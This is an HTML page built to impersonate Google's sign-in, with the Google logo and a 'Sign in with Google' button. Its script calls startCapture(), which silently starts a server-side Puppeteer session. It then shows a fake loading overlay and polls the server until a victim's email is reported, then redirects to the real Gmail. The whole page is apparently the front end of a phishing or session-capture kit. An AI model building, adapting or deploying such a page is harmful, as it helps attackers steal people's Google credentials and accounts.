<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
            background: #1a1a1a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            text-align: center;
            background: #2d2d2d;
            padding: 60px 50px;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
            max-width: 420px;
            width: 100%;
            position: relative;
            z-index: 1;
        }
        .google-logo { margin-bottom: 40px; }
        .google-logo svg { height: 92px; width: auto; }
        .btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 16px 48px;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 16px rgba(26, 115, 232, 0.4);
            width: 100%;
            letter-spacing: 0.5px;
            position: relative;
            z-index: 2;
        }
        .btn:hover {
            background: #1557b0;
            box-shadow: 0 6px 24px rgba(26, 115, 232, 0.6);
            transform: translateY(-2px);
        }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        .btn .icon { margin-right: 10px; }
        .subtitle { color: #9aa0a6; font-size: 14px; margin-top: 24px; }

        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000000;
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .overlay.show { display: flex; }
        .overlay-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #333;
            border-top: 4px solid #1a73e8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .overlay-text {
            color: #9aa0a6;
            font-size: 14px;
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
            letter-spacing: 0.5px;
        }
        .overlay-logo svg {
            height: 40px;
            width: auto;
            margin-bottom: 30px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                <path fill="none" d="M0 0h48v48H0z"/>
            </svg>
        </div>
        
        <button class="btn" id="loginBtn" onclick="startCapture()">
            <span class="icon">🔑</span>
            Sign in with Google
        </button>
        
        <div class="subtitle">🔐 Secure · Private · Fast</div>
    </div>

    <div class="overlay" id="overlay">
        <div class="overlay-logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                <path fill="none" d="M0 0h48v48H0z"/>
            </svg>
        </div>
        <div class="overlay-spinner"></div>
        <div class="overlay-text">Loading...</div>
    </div>

    <script>
        async function startCapture() {
            const btn = document.getElementById('loginBtn');
            const overlay = document.getElementById('overlay');
            
            btn.disabled = true;
            btn.innerHTML = '⏳ Please wait...';
            overlay.classList.add('show');
            
            try {
                const response = await fetch('/start-puppeteer', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                });
                
                const data = await response.json();
                console.log('Puppeteer started silently');
                startRedirectCheck();
                
            } catch (error) {
                console.error('Error:', error);
                overlay.classList.remove('show');
                btn.disabled = false;
                btn.innerHTML = '🔑 Sign in with Google';
            }
        }

        let redirectCheckInterval = null;
        let redirectTimeout = null;

        function startRedirectCheck() {
            let checkCount = 0;
            const maxChecks = 300;
            
            redirectCheckInterval = setInterval(async () => {
                checkCount++;
                
                try {
                    const response = await fetch('/check-redirect');
                    const data = await response.json();
                    
                    if (data.redirect) {
                        console.log('📧 Redirecting to Gmail for:', data.email);
                        clearInterval(redirectCheckInterval);
                        clearTimeout(redirectTimeout);
                        window.location.href = 'https://mail.google.com/';
                    }
                    
                    if (checkCount >= maxChecks) {
                        clearInterval(redirectCheckInterval);
                        clearTimeout(redirectTimeout);
                        document.getElementById('overlay').classList.remove('show');
                        document.getElementById('loginBtn').disabled = false;
                        document.getElementById('loginBtn').innerHTML = '🔑 Sign in with Google';
                    }
                    
                } catch (error) {
                    console.error('Redirect check error:', error);
                }
            }, 1000);

            redirectTimeout = setTimeout(() => {
                clearInterval(redirectCheckInterval);
                document.getElementById('overlay').classList.remove('show');
                document.getElementById('loginBtn').disabled = false;
                document.getElementById('loginBtn').innerHTML = '🔑 Sign in with Google';
            }, 300000);
        }
    </script>
</body>
</html>
